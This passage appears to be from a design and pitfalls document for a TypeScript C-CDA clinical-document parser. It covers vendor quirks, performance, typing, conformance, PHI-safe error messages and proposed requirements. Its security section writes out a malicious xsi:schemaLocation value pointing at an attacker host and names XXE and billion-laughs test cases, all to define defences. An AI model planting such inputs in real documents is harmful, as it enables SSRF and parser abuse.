**Quirk 2 — Minimal `<author>` participants:** Meditech often emits an `<author>` with only an organization (`<assignedAuthor><representedOrganization>`), no `<assignedPerson>`. REQ DOC-05h handles this (return undefined for absent person).

**Quirk 3 — Document size and base64 attachments:** Meditech inpatient CCDs can grow large with embedded discharge instructions and PDF attachments via `<observationMedia>` / `<value xsi:type="ED">`. PARSE-06 already requires lazy decode — must hold to that contract.

**Phase:** 2 (lazy base64), 7 (profiles.meditech).
**REQ coverage:** TYPES-03/04, DOC-05h, PARSE-06, BIP-03 (covered).

### C4. athenahealth

**Quirk 1 — Heavy USCDI emphasis:** athena outputs lean toward USCDI-mandated sections with consistent templating, but with some required-binding nuances on social-history observations (smoking status, in particular). `profiles.athena` should ship with USCDI-aware fixtures.

**Quirk 2 — Narrative formatted for stylesheet rendering:** athena narrative tends to use `<list>` and `<item>` heavily, with rich inline `<content styleCode="...">` markup. The narrative tree (REQ NARR-01) must preserve `styleCode` attributes; trivially covered if the narrative tree captures all attributes.

**Phase:** 5 (narrative attribute preservation), 7 (profiles.athena).
**REQ coverage:** NARR-01, BIP-04 (covered, but narrative attribute preservation should be explicit in NARR-01).

### C5. Carequality / CommonWell exchange documents

**Quirk 1 — Concise CCD pattern:** The Carequality/CommonWell Joint Content Work Group recommends "encounter-relevant content only" filtering — meaning the document carries only problems addressed during the encounter, only allergies if the system can recreate active list at encounter time, etc. The library doesn't enforce this — it parses what's there — but the README "Real-World Tolerance" section should mention that "concise" exchange documents may legitimately omit data, and consumers should not assume the document is the patient's full record.

**Quirk 2 — Bloated document size:** despite the Joint guidance, in-the-wild exchange documents from Carequality/CommonWell can be 5–50 MB, with thousands of entries. Performance traps in section D below apply with full force here. (Source: Carequality/CommonWell Joint Content Work Group v2.0, March 2022.)

**Phase:** 2 (performance discipline), 8 (docs).
**REQ coverage:** PARSE-06 lazy decode is the relevant performance lever. **Gap:** the README "concise vs full" distinction is not in DOC-08d — recommend amending.

### C6. eHealth Exchange / regional HIEs

**Quirk 1 — Aggregator-introduced quirks:** Documents passed through HIE aggregators (Surescripts CDR, regional HIEs, MPI brokers) can be modified — IDs rewritten, headers re-stamped, encoding changed (UTF-8 ↔ UTF-16 ↔ UTF-8 with BOM). The library handles BOM (REQ PARSE-07) and namespace variation (PARSE-02); the README should mention that aggregator-modified documents may have minor structural shuffles.

**Phase:** 2 (parser), 8 (docs).
**REQ coverage:** PARSE-07, PARSE-02 (covered).

---

## D. Performance Traps

### D1. Eager base64 decode of `<observationMedia>` blobs

**What goes wrong:** A diagnostic-imaging CCD with five embedded `<observationMedia>` PNGs/JPEGs eagerly decoded at parse time blows memory from a few MB of XML to 50–100 MB of decoded image bytes. Multiplied across concurrent parses in a server, the process OOMs.

**Prevention:** REQ PARSE-06 mandates lazy decode (raw base64 string exposed; `decode()` method on demand). Never decode automatically. Emit `CCDA_BASE64_ATTACHMENT_PRESENT` (in TOL-03 already) so the consumer is aware.

**Phase:** 2.
**REQ coverage:** PARSE-06, TOL-03 (covered).

### D2. Full DOM build for documents the consumer mostly throws away

**What goes wrong:** A consumer who only wants `doc.patient.mrn` from a 5MB CCD pays the full DOM-build cost. Acceptable for one-off scripts, expensive in a server processing thousands per minute.

**Prevention:**
- v1 ships a single full-document parse. Streaming / partial parse is on the v2 deferral list (per `REQUIREMENTS.md` "Streaming parser for very large documents").
- Document the perf characteristics in the README: typical 100–500KB CCD parses in single-digit ms on a modern laptop; 5MB+ exchange docs are 50–200ms; multi-MB docs with lazy attachments are bound by the XML parser, not by the C-CDA layer.
- Performance budget is documented, not CI-gated, mirroring `@cosyte/hl7`'s posture.

**Phase:** 2 (efficient parser wiring), 8 (docs).
**REQ coverage:** **Gap:** no explicit performance-documentation requirement in DOC-d. Recommend adding **DOC-18d (new):** README documents typical parse times for representative document sizes and notes the v2 streaming-parser deferral for documents exceeding ~10MB.

### D3. Re-parsing for every helper call

**What goes wrong:** A naive helper implementation (`doc.problems.active`) re-walks the section tree on every access — fine for one access, expensive for many.

**Prevention:** Helpers cache results on first access. Mutation methods (REQ MODEL-06/07) invalidate the cache — the structural-sharing-vs-`markDirty` decision (Phase 3 discuss) determines the invalidation mechanism. Single parse populates everything; subsequent reads are O(1) lookups + O(filtered-subset) iteration.

**Phase:** 3 (mutation contract), 5 (helper memoization).
**REQ coverage:** Implicit in MODEL-06/07. **Gap (minor):** the helper-memoization contract is not explicit in HELPERS-01..10. Recommend a one-liner amendment: "Helper accessors are memoized within a single document's lifetime; mutation invalidates the cache."

### D4. Unbounded narrative depth (malicious or pathological inputs)

**What goes wrong:** A `<text>` block with thousands of nested `<paragraph>` or `<table>` levels triggers stack-overflow on a recursive narrative builder.

**Prevention:**
- Iterative (not recursive) narrative tree construction with a hard depth limit (default 200, configurable). Documents exceeding the limit emit `CCDA_NARRATIVE_DEPTH_LIMIT` (**new code**) and the narrative is truncated at the limit (rest preserved as raw XML for the consumer).
- This is a defense-in-depth measure on top of the security fixtures from A5.

**Phase:** 5 (narrative tree builder).
**REQ coverage:** **Gap:** narrative-depth limit not in NARR-01. Recommend adding.

### D5. Regex-based "XPath" recompilation

**What goes wrong:** `doc.get('patient.id.extension')` implemented via regex split + recompile per call is hot-path-expensive when called in a loop.

**Prevention:** REQ MODEL-05 already constrains the path engine to "simplified XPath-ish, no XPath engine." Implementation must compile paths once and cache the compiled form. Internal helper accessors do not use the path engine — they walk the typed model directly.

**Phase:** 3.
**REQ coverage:** MODEL-05.

---

## E. TypeScript-Specific Traps

### E1. `noUncheckedIndexedAccess` interaction with XML-library attribute access

**What goes wrong:** Most JS XML libraries return attributes as `Record<string, string>` (or `Record<string, string | undefined>`). With `noUncheckedIndexedAccess: true` (required by REQ SETUP-05), every `attrs['xsi:type']` is `string | undefined` even when the underlying API guarantees a string. Result: wrappers full of `!` non-null assertions or unjustified casts — both of which violate the "no `any`, no unjustified `as`" rule (PROJECT.md constraints).

**Prevention:**
- The XML-parser adapter is the single boundary at which `unknown`/`Record` types are resolved. Inside the adapter: parse-time validation of the XML structure narrows the types; outside the adapter: no `any`, no `as`, no `!`.
- Adapter helpers like `requiredAttr(node, 'xsi:type')` and `optionalAttr(node, 'value')` return `string` and `string | undefined` respectively, with the adapter throwing or returning undefined as appropriate. The rest of the library reads through these helpers.
- If the chosen XML library returns `unknown`, the adapter's first job is to wrap it in typed accessors before any business logic touches it.

**Phase:** 1 (ADR specifies adapter contract), 2 (adapter implementation).
**REQ coverage:** SETUP-05 (strict mode), DOC-16d (ADR). **Gap:** the adapter-contract requirement is not explicit. Recommend amending DOC-16d to require: "the ADR specifies the XML-parser adapter contract (typed accessors `requiredAttr`/`optionalAttr`/`children(name)`/`textContent` etc.) such that the rest of the library code touches only typed values, never raw library output."

### E2. Discriminated unions on `xsi:type` — slow narrowing past ~20 variants

**What goes wrong:** A union type for `Observation.value` covering all RIM data types — `PQ | CD | CE | CWE | ST | INT | REAL | BL | TS | IVL_TS | EIVL_TS | ED | II | AD | PN | TEL | RTO_PQ_PQ | MO | CO | URL | ...` — exceeds 20 variants. TypeScript's narrowing on `xsi:type` discriminator becomes noticeably slower (multi-second incremental builds, slow IDE feedback, occasional "type instantiation excessively deep" errors when the union is mapped over).

**Prevention:**
- Limit the discriminated union to the data types the library actually surfaces in helpers (per REQ TYPES-01 — already a curated subset).
- For value types beyond the curated list, use a fallback `{ kind: 'unknown', xsiType: string, raw: string }` shape rather than expanding the union.
- Avoid mapped types over the full union; prefer per-type narrowing functions (`isPQ(value): value is PQ`) — these compile faster than wide `switch (value.kind)` blocks.
- Run `tsc --extendedDiagnostics` periodically and watch the "Check time" metric across PRs.

**Phase:** 3 (typed-value design).
**REQ coverage:** TYPES-01 already curates the type list. **Gap (minor):** the "fallback unknown shape" for unknown `xsi:type` values is not in TYPES-01. Recommend adding.

### E3. Avoiding `any` when XML libs return `unknown`

Same root cause as E1; same mitigation: the adapter is the single boundary. Phase 1 ADR documents the rule.

---

## F. Spec-Conformance Traps

### F1. Cross-version document straddling

**What goes wrong:** A document with the document-level R2.1 templateId (extension `2015-08-01`) but section templateIds using only R1.1 roots — or vice versa. The library must report the document version honestly without rejecting the document.

**Prevention:** Version detection per B3 above; emit `CCDA_VERSION_INCONSISTENT` (**new code**) for mixed signals. `doc.detectedVersion: 'R1.1' | 'R2.0' | 'R2.1' | 'unknown'` is an exposed property.

**Phase:** 3.
**REQ coverage:** **Gap:** `doc.detectedVersion` is not in DOC-01h..06h. Recommend adding.

### F2. USCDI / Meaningful-Use binding loosening for backward compat

**What goes wrong:** Strict mode rejects documents that use a slightly-older value-set binding for, e.g., smoking-status codes (the IG narrowed the binding in a later errata), even though the older binding was conformant when the document was generated.

**Prevention:**
- Strict mode is opt-in (REQ TOL-01); lenient default never rejects on binding violations.
- The "required binding" check (referenced in TOL-03 `CCDA_REQUIRED_BINDING_MISSING`) accepts both the current and the immediately-prior value-set version where the IG explicitly retained backward compatibility.
- Document the precise list of "loosened bindings" in a `BINDINGS.md` or as comments in the relevant template files.

**Phase:** 4 (templates + bindings), 7 (profiles for vendor-specific exceptions).
**REQ coverage:** TOL-01, TOL-03. **Gap (minor):** the "accept current + immediately-prior value-set version" rule is not explicit in REQ TOL-03; recommend a one-liner amendment.

### F3. Schematron expectations vs what we actually validate

**What goes wrong:** The library claims "validated against the IG" but ships only structural cardinality + required-template + required-binding checks (REQ PARSE-08, TOL-03). Real Schematron rules are far more numerous — co-occurrence rules, value-set narrowing, semantic constraints. Consumers who assume "validated" means "Schematron-clean" are misled.

**Prevention:**
- The README "Strict Mode" section (REQ DOC-08d) must explicitly state: "We do NOT run the official C-CDA Schematron. Strict mode validates structural cardinality, required templateIds, and required code-system bindings drawn from the IG. Schematron-conformant validation is on the v2 roadmap."
- Errors emitted by strict mode use a code prefix that signals their narrow scope (e.g., `CCDA_STRUCT_*`) — never `CCDA_SCHEMATRON_*`.
- The "Roadmap / stretch goals" section (REQ DOC-12d) lists Schematron validation as deferred.

**Phase:** 8 (docs).
**REQ coverage:** DOC-08d, DOC-12d, TOL-06. **Gap:** the explicit "we do NOT run Schematron" disclaimer is not currently named in DOC-08d. Recommend amending DOC-08d to require this exact disclaimer.

---

## G. Library-Author Traps

### G1. Coupling parser to a specific XML library

**Confirmed: the adapter pattern is the right call.** Specifically:

- The XML-parser ADR (REQ DOC-16d) names a primary parser, but the adapter contract is defined in code such that swapping the underlying library is a single-file change.
- The adapter exposes node-level operations (`localName`, `namespaceURI`, `children`, `attributes`, `textContent`, `processingInstructions`, `position`) — not library-specific node objects.
- All `src/parser/`, `src/model/`, `src/templates/`, and `src/helpers/` code uses adapter types only; never imports the underlying XML library directly.
- Test fixtures verify that the adapter's surface is library-agnostic by stubbing it in `src/parser/__tests__/`.
- This protects against (a) the chosen library being deprecated, (b) a security CVE forcing a rapid swap, (c) future "use a faster parser" PRs without rewriting the world.

**Phase:** 1 (ADR + adapter contract), 2 (adapter implementation).
**REQ coverage:** SETUP-03, DOC-16d. **Gap:** the adapter-contract requirement is not explicit (already noted in E1). Strengthen DOC-16d.

### G2. "Validated against the IG" claim without Schematron

Already covered in F3.

### G3. Profile system that lets users break the parser

**What goes wrong:** A `defineProfile` API rich enough to override built-in templates lets a user accidentally redefine `Problem Concern Act` in a way that breaks every helper that depends on it.

**Prevention:**
- `defineTemplate` requires `{ override: true }` to replace a built-in (REQ TPL-03) — this is the right safeguard.
- Profile overrides are scoped to the parses that use that profile (REQ PROF-06/07) — global state pollution is avoided unless `setDefaultProfile` is used.
- `setDefaultProfile` is documented as discouraged (mirrors `@cosyte/hl7`'s "discouraged" stance — see PROJECT.md key decisions for `@cosyte/hl7`).
- Profile-broken parses still fall back to lenient mode for the rest of the document (a profile-specific template parser that throws should be caught and the entry skipped with a warning); throwing inside a custom template handler should not poison the entire parse.
- **New requirement candidate:** `PROF-10 (new)` — Custom-template parse functions that throw are caught and surfaced as `CCDA_PROFILE_TEMPLATE_HANDLER_ERROR` (**new code**) with the entry skipped; the rest of the document parses normally.

**Phase:** 7.
**REQ coverage:** TPL-03/04, PROF-06/07/08. **Gap:** the "throwing custom-template handler is contained" behavior is not in PROF-*. Recommend adding PROF-10 + the warning code.

### G4. Built-in OID registry shipping outdated entries

**What goes wrong:** The OID registry (REQ CODE-01) hardcodes a snapshot of HL7-maintained code-system OIDs. HL7 publishes errata; the snapshot drifts. Months later, a new code system the snapshot doesn't know about emits `CCDA_OID_NOT_RECOGNIZED` warnings on real documents.

**Prevention:**
- The built-in OID registry covers the high-stability "core 10–15" code-system OIDs explicitly listed in REQ CODE-01 (SNOMED, LOINC, RxNorm, ICD-10-CM, ICD-10-PCS, CPT-4, CVX, UCUM, NDC, HL7 Administrative Gender / Marital Status / Race Category / Ethnicity). These OIDs do not change.
- For longer-tail value sets, the registry is profile-extensible (REQ CODE-03) — vendors and integrations register their own.
- The README "Coded Values" Cookbook recipe (REQ DOC-06d) shows the consumer how to extend the registry via a profile.
- **Freshness expectation:** the built-in OID registry is reviewed annually against the HL7 OID registry; major bumps are documented in CHANGELOG.md (REQ DOC-14d).

**Phase:** 4 (registry), 8 (docs).
**REQ coverage:** CODE-01, CODE-03, DOC-14d. **Gap:** the annual-review-and-changelog freshness contract is not explicit. Recommend adding to CODE-01 or as a CONTRIBUTING.md note.

---

## H. Security Traps (Beyond A5)

### H1. PHI in error messages and warning positional context

**What goes wrong:** A warning like `"CCDA_NULLFLAVOR_IN_REQUIRED_FIELD: <patient><name><given>Jonathan</given></name></patient>"` echoes the patient's name. If the consumer logs warnings to a non-HIPAA-safe log sink (Sentry, generic JSON logs, syslog forwarder), this becomes a PHI breach. The library's positional context (XPath-ish path, line/column) is fine — but echoing element *content* is a PHI hazard.

**Prevention:**
- `CCDAParseWarning` and `CCDAParseError` carry **structural** positional context: XPath-ish path (`/ClinicalDocument/recordTarget/patientRole/patient/name[1]/given[1]`), line, column. They do **not** carry element text content.
- For `CCDAParseError` (Tier 3 fatal), a `snippet` field is exposed (REQ TOL-02 already requires this) — but the snippet is bounded (e.g., 80 chars, configurable down to 0) and the README warns the consumer about logging discipline.
- A `{ redactSnippets: true }` parser option zeros all snippet content (replaces with `[REDACTED]`), recommended for production server use.
- Add a **PHI-handling section** to the README and to SECURITY.md: "warnings and errors NEVER carry element text content; the `snippet` field on fatal errors carries up to 80 chars of raw XML around the failure position; use `{ redactSnippets: true }` in PHI-sensitive contexts."

**Phase:** 2 (warning shape), 8 (SECURITY.md + README).
**REQ coverage:** TOL-02, TOL-03, TOL-04. **Gap (significant):**
- TOL-04 / TOL-03 do not currently constrain warnings to be content-free.
- `{ redactSnippets: true }` option is not specified.
- README PHI-discipline section is not in DOC-d.
**Recommended new REQs:**
- **TOL-07 (new):** `CCDAParseWarning` and `CCDAParseError` positional context contains structural identifiers only (XPath-ish path, line, column) and never element text content.
- **TOL-08 (new):** `parseCCDA(raw, { redactSnippets: true })` zeros the `snippet` field on all fatal errors; default is to retain up to 80 chars of raw-XML snippet for developer diagnostics.
- **DOC-19d (new):** README "Security & PHI" section covers warning content guarantees, `{ redactSnippets: true }`, and the SECURITY.md cross-link.

### H2. `xsi:schemaLocation` poisoning

**What goes wrong:** A malicious document declares `xsi:schemaLocation="urn:hl7-org:v3 http://attacker.example.com/CDA.xsd"` and a parser that fetches the schema for validation makes an outbound request, leaking parser fingerprint and enabling SSRF.

**Prevention:**
- The library does not perform XSD validation against external schemas. Period. If we add schema validation later, schemas are bundled, never fetched.
- The XML-parser adapter rejects any attempt to fetch external resources at parse time (no `nonet`, `dtdload: false`, etc. — same posture as A5).
- `xsi:schemaLocation` and `xsi:noNamespaceSchemaLocation` attributes are read for informational purposes only (logged via warning if their hosts look unexpected) and never trigger network access.

**Phase:** 1 (ADR enforces no-fetch), 2 (adapter).
**REQ coverage:** **Gap:** no explicit "no external resource fetch" requirement. Recommend folding into the new PARSE-09 from A5.

### H3. Decompression bombs in base64-encoded `<observationMedia>` (defense in depth)

**What goes wrong:** A base64 payload that decodes to a malicious zip-bomb-style image format (some CT-snapshot SR formats can carry compressed embedded data) consumes memory on decode.

**Prevention:**
- Lazy decode (REQ PARSE-06) is the primary defense — the library never decodes unless the consumer asks.
- When the consumer calls `attachment.decode()`, decoded size is bounded by a configurable cap (default 50MB); exceeding the cap throws `CCDAAttachmentTooLargeError` (**new typed error**).
- The README "Security & PHI" section documents the cap and how to configure it.

**Phase:** 2 (decode bound), 8 (docs).
**REQ coverage:** PARSE-06. **Gap:** decode-size bound and the typed error are not in PARSE-06. Recommend amending.

---

## I. HL7 v2 Lessons That Translate (from `@cosyte/hl7`)

The `@cosyte/hl7` lessons that carry over directly:

- **Lenient default + strict opt-in** — proven correct for HL7 v2; same threat model in C-CDA.
- **Stable warning codes with positional context** — same; CCDA's positional context is XPath-ish instead of segment.field.
- **Postel's Law (liberal parser, conservative serializer)** — same; CDA serialization is more involved due to namespaces and stylesheets, but the principle is identical.
- **`defineProfile` as a first-class API + starter kit** — same; growth-loop value is even higher for CDA because vendor-specific quirks are richer.
- **Immutable by default, explicit mutation methods** — same.
- **No console logging in library code** — same.
- **Discouraged-but-available `setDefaultProfile`** — same.

The lessons that require *adaptation*:

- **HL7 v2 parser is zero-dep**; CCDA parser is ≤ 3-dep with ADR-justified XML library. The runtime-dep escalation is intentional — XML with namespace + mixed-content + IDREF support is not worth re-implementing.
- **HL7 v2's positional codes are `MSH.10` etc.** — short, segment-relative. **CCDA's positional codes** are XPath-ish (`/ClinicalDocument/component/structuredBody/component[2]/section/entry[3]/...`) — long, but unambiguous. The library shortens these when emitting (e.g., `section[code=11450-4]/entry[3]`) for human readability.
- **HL7 v2 has a 4-tier deviation model**; CCDA settles on 3 tiers (silent / warn / fatal) with strict-mode escalation, per REQ TOL-01. The fourth tier (strict-only) is the strict-mode-only validation issue path (REQ TOL-06, `doc.issues`).

---

## REQUIREMENTS.md Gap Analysis

Pitfalls above identify the following gaps in the current REQUIREMENTS.md. Each is named with the recommended new REQ-ID (or the amendment to an existing REQ).

### Critical (security / correctness)

| Gap | Recommendation | Reference |
|-----|----------------|-----------|
| No requirement that DTDs are disabled by default | **PARSE-09 (new):** DTDs disabled by default; DOCTYPE → `DTD_DECLARATION_PRESENT` fatal unless `{ allowDTD: true }`; external entities never resolved; external DTDs never fetched. | A5, H2 |
| `DTD_DECLARATION_PRESENT` not in fatal-code list | Amend **TOL-02** to add the code. | A5 |
| `MULTIPLE_CLINICAL_DOCUMENTS` not in fatal-code list | Amend **TOL-02** to add the code. | C1 |
| Warnings can leak PHI element content | **TOL-07 (new):** positional context is structural only, never element text. | H1 |
| No snippet-redaction option | **TOL-08 (new):** `{ redactSnippets: true }` zeros `snippet` field. | H1 |
| No security-fixture requirement | **TEST-10 (new):** `test/fixtures/security/` with XXE / billion-laughs / external-DTD / `xsi:schemaLocation` cases; each must produce a fatal error. | A5 |
| No SECURITY.md | **DOC-17d (new):** `SECURITY.md` exists, documents threat model, parser version pin, disclosure address. | A5 |
| README PHI-handling section missing | **DOC-19d (new):** "Security & PHI" section in README. | H1 |
| Decode-size bound on base64 attachments not specified | Amend **PARSE-06** to require a configurable decode cap (default 50MB) with a typed `CCDAAttachmentTooLargeError`. | H3 |

### Significant (correctness / DX)

| Gap | Recommendation | Reference |
|-----|----------------|-----------|
| `nullFlavor` field not exposed on typed values; `NullFlavor` enum not exported | Amend **TYPES-01** and **TYPES-02** to require `nullFlavor` on every typed value field; export `NullFlavor` enum. | B4 |
| "No known X" allergy/problem/medication assertions not specified | Amend **HELPERS-01..03** with explicit "no known X" semantics (single-element array with `noKnownX: true`, sourced from `nullFlavor` or IHE No-Known-X templates). | B4 |
| `IVL_TS` `lowNullFlavor`/`highNullFlavor` not specified | Amend **TYPES-01** to enumerate. | B6 |
| Active-vs-historical decision rule not specified | Amend **HELPERS-02** (medications) and **HELPERS-01** (problems) with the rule. | B6 |
| `originalText` IDREF resolution not explicit | Amend **TYPES-02** to clarify `originalText` resolves IDREFs to narrative text. | B5 |
| `additionalRaceCodes[]` (sdtc:raceCode) not in patient | Amend **DOC-04h** to include it. | C1 |
| `doc.detectedVersion` not specified | Amend **DOC-01h..02h** to add. | F1 |
| No "we don't run Schematron" disclaimer in README | Amend **DOC-08d** to require the explicit disclaimer. | F3 |
| Concise-vs-full exchange-document distinction not in README | Amend **DOC-08d** to mention. | C5 |
| Adapter contract not explicit in ADR requirement | Amend **DOC-16d** to require typed-accessor adapter contract. | E1, G1 |
| Helper memoization not explicit | Amend **HELPERS-01..10** with a one-line memoization contract. | D3 |
| Profile-handler-throw containment not specified | **PROF-10 (new):** custom-template handlers that throw are caught; entry skipped; `CCDA_PROFILE_TEMPLATE_HANDLER_ERROR` emitted. | G3 |

### Warning-code additions to TOL-03

The following warning codes are recommended additions to the TOL-03 list:

| Code | Tier | Trigger | Reference |
|------|------|---------|-----------|
| `CCDA_MISSING_XSI_TYPE` | 2 | `<value>` element where IG requires `xsi:type` is missing it | A3 |
| `CCDA_XSI_TYPE_NAMESPACE_DEVIATION` | 2 | `xsi:type` QName resolves to a non-`urn:hl7-org:v3` namespace | A3 |
| `CCDA_VERSION_INCONSISTENT` | 2 | Document- and section-level templateIds suggest mixed C-CDA versions | B3, F1 |
| `CCDA_DISPLAYNAME_MISSING_USED_NARRATIVE` | 2 (informational) | `displayName` absent; resolved from narrative IDREF | B5 |
| `CCDA_MRN_OID_NOT_RECOGNIZED` | 2 | No `<id>` on patient-role matched a known MRN OID | B8 |
| `CCDA_UNRECOGNIZED_ELEMENT` | 2 (informational) | An unknown child element was skipped under a known template | C1 |
| `CCDA_NARRATIVE_PLACEHOLDER` | 2 (informational, optional) | Section narrative below a length threshold but entries populated | B2 |
| `CCDA_NARRATIVE_DEPTH_LIMIT` | 2 | Narrative tree exceeded depth limit; remainder preserved as raw | D4 |
| `CCDA_PROFILE_TEMPLATE_HANDLER_ERROR` | 2 | Custom template handler threw; entry skipped; rest of doc parses normally | G3 |

### Minor (docs / nice-to-have)

| Gap | Recommendation | Reference |
|-----|----------------|-----------|
| `section.hasStructuredEntries` convenience flag not in MODEL-03 | Amend **MODEL-03**. | B1 |
| Performance documentation not in README | **DOC-18d (new):** README documents typical parse times. | D2 |
| Translations Cookbook recipe not in DOC-06d | Amend **DOC-06d** to include "find the ICD-10 from a SNOMED-coded problem." | B7 |
| OID-registry annual-review contract not explicit | Amend **CODE-01** or note in CONTRIBUTING.md. | G4 |
| BIP-02 (Cerner profile) generic | Amend **BIP-02** to enumerate Cerner-specific patterns covered by the profile fixture. | C2 |
| "Loosened binding" rule not explicit in TOL-03 | Amend **TOL-03** with a one-liner. | F2 |
| Unknown-`xsi:type` fallback shape not in TYPES-01 | Amend **TYPES-01**. | E2 |

---

## Sources

### Authoritative (HIGH confidence)

- [HL7 C-CDA R2.1 Companion Guide (Confluence, 2017MAR INFORM)](https://confluence.hl7.org/download/attachments/49645557/CDAR2_IG_CCDA_COMPANION_R1_INFORM_2017MAR.pdf)
- [HL7 C-CDA Companion Guide R4.1 (2023JUN, cal-med.com mirror)](https://www.cal-med.com/fhir/HL7_CCDA_Companion_Guide.pdf)
- [HL7 CDA-ccda-companion (GitHub) — Schematron, samples, artifacts](https://github.com/HL7/CDA-ccda-companion)
- [HL7 C-CDA-Examples (GitHub) — official IG example documents](https://github.com/HL7/C-CDA-Examples)
- [HL7 CDA Extensions (sdtc / voc namespaces) — Confluence](https://confluence.hl7.org/display/SD/CDA+Extensions)
- [HL7 C-CDA R2.1 Document-Level Guidance (build.fhir.org)](https://build.fhir.org/ig/HL7/CDA-ccda-2.1-sd/document_level_guidance.html)
- [HL7 C-CDA R2.1 Design Considerations (build.fhir.org)](https://build.fhir.org/ig/HL7/CDA-ccda-2.1-sd/designconsiderations.html)
- [HL7 C-CDA R2.2 Representation of Discrete Data (Trifolia)](https://trifolia-fhir.lantanagroup.com/igs/lantana_hapi_r4/cda-ccda/representation_of_discrete_data.html)
- [HL7 C-CDA R2.2 Appendix (sdtc namespace details)](https://build.fhir.org/ig/HL7/CDA-ccda-2.2/appendix.html)
- [Carequality/CommonWell Joint Content Work Group v2.0 (March 2022)](https://carequality.org/wp-content/uploads/2022/04/Improve-C-CDA-Joint-Content-WG-v2.0-20220316-DISTRO.pdf)
- [OWASP XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [CVE-2026-26278 — fast-xml-parser DoS via DOCTYPE entity expansion (GitHub Advisory)](https://github.com/advisories/GHSA-jmr7-xgp7-cmfj)
- [CVE-2026-33349 — fast-xml-parser bypass of maxEntityCount/maxEntitySize](https://www.sentinelone.com/vulnerability-database/cve-2026-33349/)
- [CVE-2021-21366 — xmldom XXE / namespace serialization vulnerability (Snyk)](https://security.snyk.io/vuln/SNYK-JS-XMLDOM-1084960)
- [HL7 V3 ITS XML Data Types — wire format (Norwegian HL7 mirror)](http://hl7.ihelse.net/hl7v3/infrastructure/itsxml/datatypes_its_xml_r2wfc.html)
- [Open Epic — Exchanging Clinical Findings (overview)](https://open.epic.com/Clinical/EHRtoEHR)

### Useful (MEDIUM confidence — community / blog / listserv)

- [HL7 ccda_samples Google Group — "Baseline C-CDA CCD With No Information"](https://groups.google.com/g/ccda_samples/c/QazwzrmD0IM)
- [HL7 transport-testing-tool Google Group — "Need clarity on NullFlavor usage in CCDA files"](https://groups.google.com/g/transport-testing-tool/c/tIkov9qXBoU)
- [HL7 edge-test-tool Google Group — "CCDA validator is enforcing PQ data type for results"](https://groups.google.com/g/edge-test-tool/c/hS0CZf8fgbc)
- [HL7 edge-test-tool Google Group — "CCDA document type" (version detection)](https://groups.google.com/g/edge-test-tool/c/Zp0S6j9unm8)
- [Healthcare Standards (motorcycleguy) — "What version of CCDA Document is this?"](https://motorcycleguy.blogspot.com/2017/01/what-version-of-ccda-document-is-this.html)
- [Healthcare Standards (motorcycleguy) — "On dealing with preferred coding in CCDA"](https://motorcycleguy.blogspot.com/2012/08/on-dealing-with-preferred-coding-in-ccda.html)
- [Lantana Group — CDA Best Practices (Trifolia Workbench)](https://trifolia.lantanagroup.com/Help/CDABestPractices.html)
- [Dynamic Health IT — Common Sense in C-CDA: Comparing Carequality/CommonWell to R2.1](https://dynamichealthit.com/post/common-sense-in-c-cda-comparing-carequality-commonwell-c-cda-to-r2-1/)
- [chb/sample_ccdas (GitHub) — community CCDA fixture corpus](https://github.com/chb/sample_ccdas)
- [onc-healthit/ccda-parser (GitHub) — ONC reference C-CDA parser (Java) and IG fixtures](https://github.com/onc-healthit/ccda-parser)
- [npm-compare — XML library comparison (fast-xml-parser, sax, libxmljs2, xmldom)](https://npm-compare.com/fast-xml-parser,libxmljs,libxmljs2,sax,xml2js,xmlbuilder,xmldom)
